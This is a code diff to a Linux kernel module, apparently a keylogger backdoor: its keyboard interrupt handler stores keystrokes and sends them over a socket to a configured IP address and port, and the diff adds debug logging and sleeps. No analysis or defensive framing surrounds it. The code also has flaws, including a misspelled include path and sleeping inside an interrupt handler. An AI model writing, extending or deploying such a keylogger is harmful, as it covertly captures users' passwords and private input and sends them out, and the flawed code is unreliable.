@@ -4,6 +4,7 @@
 #include <linux/keyboard.h>
 #include <linux/irq.h>
 #include <linux/interrupt.h>
+#include <linus/delay.h>
 
 #include "backdoor.h"
 #include "utils/networking.c"
@@ -27,10 +28,19 @@ irqreturn_t keyboard_interrupt_handler(int irq, void *dev_id) {
         keystrokes[buffer_count] = key;
         buffer_count = (buffer_count + 1)%KEY_BUFFER_SIZE;
 
+        printk(KERN_INFO "Buffer: %s", buffer);
+        printk(KERN_INFO "Buffer size: %d", buffer_count);
+
         if (buffer_count == 0) {
             struct socket* sock = create_socket(IP_ADDRESS, PORT);
+            printk(KERN_INFO "Created socket");
+            msleep(10000);
             send_message(sock, keystrokes);
+            printk(KERN_INFO "Sent message");
+            msleep(10000);
             shutdown_socket(sock);
+            printk(KERN_INFO "Closed socket");
+            msleep(10000);
         }
     }
 
